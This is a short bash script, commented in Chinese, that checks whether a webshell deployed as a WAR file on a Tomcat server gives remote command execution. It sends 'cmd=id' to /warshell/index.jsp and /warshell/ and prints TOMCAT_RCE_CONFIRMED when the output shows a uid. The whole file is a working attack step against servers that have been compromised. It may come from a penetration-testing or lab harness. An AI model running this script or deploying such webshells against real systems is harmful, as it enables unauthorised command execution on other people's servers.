#!/bin/bash
# 验证 WAR webshell RCE
# Usage: tomcat_verify_rce.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

BASE=$(echo "$ENDPOINT" | sed 's|^\(https\?://[^/]*\).*|\1|')
sleep 2
result=$(curl -s "$BASE/warshell/index.jsp?cmd=id" --max-time 10 2>/dev/null)
echo "RCE: $result"
echo "$result" | grep -q "uid=" && echo "TOMCAT_RCE_CONFIRMED" && exit 0
result2=$(curl -s "$BASE/warshell/?cmd=id" --max-time 10 2>/dev/null)
echo "RCE2: $result2"
echo "$result2" | grep -q "uid=" && echo "TOMCAT_RCE_CONFIRMED"
